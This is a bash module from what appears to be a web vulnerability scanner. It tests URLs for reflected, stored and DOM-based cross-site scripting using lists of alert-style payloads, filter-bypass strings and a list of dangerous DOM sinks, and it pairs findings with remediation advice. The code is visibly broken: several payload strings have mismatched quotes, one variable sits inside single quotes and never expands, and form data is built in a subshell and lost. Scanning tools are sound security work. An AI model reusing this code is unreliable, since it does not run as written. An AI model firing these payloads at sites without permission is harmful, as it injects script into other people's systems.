#!/bin/bash

# XSS Testing Module
# Tests for Reflected, Stored, and DOM-based XSS vulnerabilities

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/http_helper.sh"

# Main XSS testing function
test_xss() {
    local url=$1
    local project_id=$2

    log_info "Testing XSS vulnerabilities on $url"

    # Test reflected XSS
    test_reflected_xss "$url" "$project_id"

    # Test stored XSS
    test_stored_xss "$url" "$project_id"

    # Test DOM-based XSS
    test_dom_xss "$url" "$project_id"
}

# Test reflected XSS
test_reflected_xss() {
    local url=$1
    local project_id=$2

    log_info "[XSS] Testing Reflected XSS on $url"

    # XSS payloads - progressively complex
    local payloads=(
        '<script>alert(1)</script>'
        '<img src=x onerror=alert(1)>"
        "'-alert(1)-'"
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
        "<svg/onload=alert(1)>"
        '<iframe src=javascript:alert(1)>"
        '<body onload=alert(1)>"
        "<input onfocus=alert(1) autofocus>"
        "<select onfocus=alert(1) autofocus>"
        "<textarea onfocus=alert(1) autofocus>"
        "<keygen onfocus=alert(1) autofocus>"
        "<video><source onerror=alert(1)>"
        "<audio src=x onerror=alert(1)>"
        "<details open ontoggle=alert(1)>"
        "<marquee onstart=alert(1)>"
        # Polyglot payloads
        'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */onerror=alert(1) )//'
        # Filter bypass
        '<scr<script>ipt>alert(1)</scr</script>ipt>'
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
    )

    # Extract parameters from URL
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        log_debug "[XSS] No parameters found in URL, testing common parameter names"
        # Test common parameter names
        local common_params=("q" "search" "query" "keyword" "name" "id" "page" "redirect" "url" "msg" "message" "comment")
        for param in "${common_params[@]}"; do
            test_xss_parameter "$url" "$param" "$project_id" "${payloads[@]}"
        done
    else
        # Test each parameter found in URL
        echo "$params" | while read -r param; do
            test_xss_parameter "$url" "$param" "$project_id" "${payloads[@]}"
        done
    fi
}

# Test XSS on specific parameter
test_xss_parameter() {
    local base_url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[XSS] Testing parameter: $param"

    for payload in "${payloads[@]}"; do
        # URL encode the payload
        local encoded_payload=$(urlencode "$payload")

        # Build test URL - simplified approach
        local test_url=""
        if [[ "$base_url" == *"?"* ]]; then
            # URL has parameters, use ampersand
            test_url="${base_url}"'&'"${param}=${encoded_payload}"
        else
            # First parameter, use question mark
            test_url="${base_url}?${param}=${encoded_payload}"
        fi

        # Send request and capture response (using project User-Agent)
        local response=$(vuln_curl "$project_id" \
                         -H "Accept: text/html,application/xhtml+xml,application/xml" \
                         -w "\n---HTTP_CODE:%{http_code}---" \
                         "$test_url" 2>/dev/null)

        local body=$(echo "$response" | sed -n '1,/---HTTP_CODE:/p' | head -n -1)
        local http_code=$(echo "$response" | grep -o "---HTTP_CODE:[0-9]*" | cut -d: -f2)

        # Check if payload is reflected without encoding
        if echo "$body" | grep -qF "$payload"; then
            log_success "[XSS] Reflected XSS found in parameter '$param'"

            # Determine context (HTML, attribute, JavaScript, etc.)
            local context=$(detect_xss_context "$body" "$payload")

            db_add_finding "$project_id" "high" "xss_reflected" \
                "Reflected XSS in parameter '$param'" \
                "URL: $test_url\nPayload: $payload\nContext: $context\nThe payload is reflected in the response without proper encoding/sanitization.\n\nHTTP Response Code: $http_code" \
                "" "7.5" \
                "Implement proper output encoding based on context:\n- HTML context: HTML entity encoding\n- JavaScript context: JavaScript escaping\n- Attribute context: Attribute encoding\n- URL context: URL encoding\n\nConsider implementing Content Security Policy [CSP] headers."

            # Save evidence
            save_xss_evidence "$project_id" "$test_url" "$payload" "$body"

            # Found vulnerability, no need to test more payloads for this param
            return 0
        fi

        # Check for partial reflection (might indicate filter bypass opportunity)
        local payload_partial=$(echo "$payload" | sed 's/<[^>]*>//g' | sed 's/[^a-zA-Z0-9]//g')
        if [ -n "$payload_partial" ] && echo "$body" | grep -qi "$payload_partial"; then
            log_warn "[XSS] Partial reflection detected in parameter '$param' - potential filter bypass"
        fi
    done

    return 1
}

# Test stored/persistent XSS
test_stored_xss() {
    local url=$1
    local project_id=$2

    log_info "[XSS] Testing Stored XSS on $url"

    # Find forms on the page
    local page_content=$(curl -s -L "$url")

    # Check if page has forms
    if ! echo "$page_content" | grep -qi '<form'; then
        log_debug "[XSS] No forms found for stored XSS testing"
        return 1
    fi

    # Extract form action and method
    local form_action=$(echo "$page_content" | grep -oP '<form[^>]*action=["'"'"']?\K[^"'"'"'\s>]+' | head -1)
    local form_method=$(echo "$page_content" | grep -oP '<form[^>]*method=["'"'"']?\K[^"'"'"'\s>]+' | head -1 | tr '[:upper:]' '[:lower:]')

    # Default to POST if method not specified
    [ -z "$form_method" ] && form_method="post"

    # Build absolute URL for form action
    if [[ "$form_action" == http* ]]; then
        local submit_url="$form_action"
    elif [[ "$form_action" == /* ]]; then
        local base_domain=$(echo "$url" | grep -oP '^https?://[^/]+')
        local submit_url="${base_domain}${form_action}"
    else
        local submit_url="${url%/*}/${form_action}"
    fi

    # Test stored XSS with unique identifier
    local unique_id="xss_$(date +%s)_$$"
    local stored_payloads=(
        '<script>/*${unique_id}*/alert(1)</script>'
        '<img src=x onerror='/*${unique_id}*/alert(1)'>"
        "<!--${unique_id}--><svg/onload=alert(1)>"
    )

    for payload in "${stored_payloads[@]}"; do
        log_debug "[XSS] Testing stored payload: $payload"

        # Extract input fields
        local input_fields=$(echo "$page_content" | grep -oP '<input[^>]*name=["'"'"']?\K[^"'"'"'\s>]+')

        # Build POST data with payload in all text fields
        local post_data=""
        echo "$input_fields" | while read -r field; do
            local field_type=$(echo "$page_content" | grep -oP "<input[^>]*name=[\"']?${field}[\"']?[^>]*type=[\"']?\K[^\"'\s>]+")

            if [[ "$field_type" == "text" ]] || [[ "$field_type" == "email" ]] || [[ "$field_type" == "" ]]; then
                post_data="${post_data}${field}=${payload}&"
            else
                post_data="${post_data}${field}=test&"
            fi
        done
        post_data="${post_data%&}"  # Remove trailing &

        # Submit form
        if [ "$form_method" == "post" ]; then
            curl -s -X POST "$submit_url" \
                 -d "$post_data" \
                 -H "Content-Type: application/x-www-form-urlencoded" \
                 -A "Mozilla/5.0" \
                 > /dev/null
        else
            curl -s "${submit_url}?${post_data}" > /dev/null
        fi

        # Wait a moment for data to be stored
        sleep 2

        # Check if payload is now present on the page
        local check_response=$(curl -s -L "$url")

        if echo "$check_response" | grep -qF "$unique_id"; then
            log_critical "[XSS] Stored XSS vulnerability found!"

            db_add_finding "$project_id" "critical" "xss_stored" \
                "Stored/Persistent XSS Vulnerability" \
                "URL: $url\nSubmit URL: $submit_url\nPayload: $payload\nUnique ID: $unique_id\n\nThe application stores user input without proper sanitization and displays it to other users, allowing persistent XSS attacks." \
                "" "9.0" \
                "1. Implement input validation and sanitization on the server-side\n2. Apply context-aware output encoding when displaying stored data\n3. Use Content Security Policy [CSP] headers\n4. Consider using a Web Application Firewall [WAF]\n5. Regularly scan stored data for malicious content"

            save_xss_evidence "$project_id" "$url" "$payload" "$check_response"
            return 0
        fi
    done

    log_debug "[XSS] No stored XSS vulnerabilities found"
    return 1
}

# Test DOM-based XSS
test_dom_xss() {
    local url=$1
    local project_id=$2

    log_info "[XSS] Testing DOM-based XSS on $url"

    # DOM XSS payloads (fragment-based)
    local dom_payloads=(
        "#<img src=x onerror=alert(1)>"
        "#'><script>alert(1)</script>'
        "#<svg/onload=alert(1)>"
        "#javascript:alert(1)"
    )

    # Check if page uses JavaScript that accesses location.hash, document.URL, etc.
    local page_js=$(curl -s -L "$url" | grep -oP '<script[^>]*>.*?</script>' | tr '\n' ' ')

    # Look for dangerous DOM sinks
    local dangerous_sinks=(
        "location.hash"
        "location.search"
        "document.URL"
        "document.documentURI"
        "document.baseURI"
        "window.name"
        "document.referrer"
        "eval("
        "innerHTML"
        "outerHTML"
        "document.write"
        "document.writeln"
    )

    local has_dom_sink=false
    for sink in "${dangerous_sinks[@]}"; do
        if echo "$page_js" | grep -qF "$sink"; then
            log_debug "[XSS] Dangerous DOM sink found: $sink"
            has_dom_sink=true
        fi
    done

    if [ "$has_dom_sink" = false ]; then
        log_debug "[XSS] No obvious DOM sinks found, skipping DOM XSS tests"
        return 1
    fi

    # Test each DOM payload
    for payload in "${dom_payloads[@]}"; do
        local test_url="${url}${payload}"

        log_debug "[XSS] Testing DOM payload: $test_url"

        # For DOM XSS we need a headless browser, but we can do basic checks
        local response=$(curl -s -L "$test_url")

        # Check if payload appears in a dangerous context
        if echo "$response" | grep -E "innerHTML.*=.*${payload}|document.write.*${payload}|eval.*${payload}" > /dev/null; then
            log_success "[XSS] Potential DOM-based XSS found"

            db_add_finding "$project_id" "high" "xss_dom" \
                "Potential DOM-based XSS Vulnerability" \
                "URL: $test_url\nPayload: $payload\n\nThe application uses dangerous DOM sinks that process URL fragments without proper sanitization.\n\nNote: This is a potential finding. Manual verification with browser DevTools is recommended." \
                "" "7.0" \
                "1. Avoid using dangerous DOM sinks with untrusted data\n2. Use textContent instead of innerHTML when possible\n3. Sanitize data from location.hash, document.URL, etc. before using\n4. Implement Content Security Policy [CSP]\n5. Use DOMPurify or similar sanitization libraries"

            save_xss_evidence "$project_id" "$test_url" "$payload" "$response"
        fi
    done
}

# Helper: Extract URL parameters
extract_url_parameters() {
    local url=$1

    if [[ "$url" != *"?"* ]]; then
        return 1
    fi

    local query_string="${url#*\?}"
    echo "$query_string" | tr '&' '\n' | cut -d= -f1
}

# Helper: URL encode
urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done

    echo "$encoded"
}

# Helper: Detect XSS context in response
detect_xss_context() {
    local body=$1
    local payload=$2

    # Find where payload appears in the HTML
    local context_sample=$(echo "$body" | grep -A2 -B2 "$payload" | head -5)

    if echo "$context_sample" | grep -qP '<script[^>]*>.*'"$payload"; then
        echo "JavaScript context"
    elif echo "$context_sample" | grep -qP '<[^>]+\s+[^>]*=["'"'"'][^"'"'"']*'"$payload"; then
        echo "HTML attribute context"
    elif echo "$context_sample" | grep -qP 'href=["'"'"'][^"'"'"']*'"$payload"; then
        echo "URL context (href)"
    elif echo "$context_sample" | grep -qP 'style=["'"'"'][^"'"'"']*'"$payload"; then
        echo "CSS context"
    else
        echo "HTML body context"
    fi
}

# Helper: Save XSS evidence
save_xss_evidence() {
    local project_id=$1
    local url=$2
    local payload=$3
    local response=$4

    local evidence_dir="data/projects/${project_id}/evidence/xss"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    local evidence_file="${evidence_dir}/xss_${timestamp}.html"

    cat > "$evidence_file" <<EOF
<!-- XSS Evidence -->
<!-- URL: $url -->
<!-- Payload: $payload -->
<!-- Captured: $(date) -->

$response
EOF

    log_debug "[XSS] Evidence saved to: $evidence_file"
}

# Export functions
export -f test_xss
export -f test_reflected_xss
export -f test_stored_xss
export -f test_dom_xss
export -f test_xss_parameter
export -f extract_url_parameters
export -f urlencode
export -f detect_xss_context
export -f save_xss_evidence
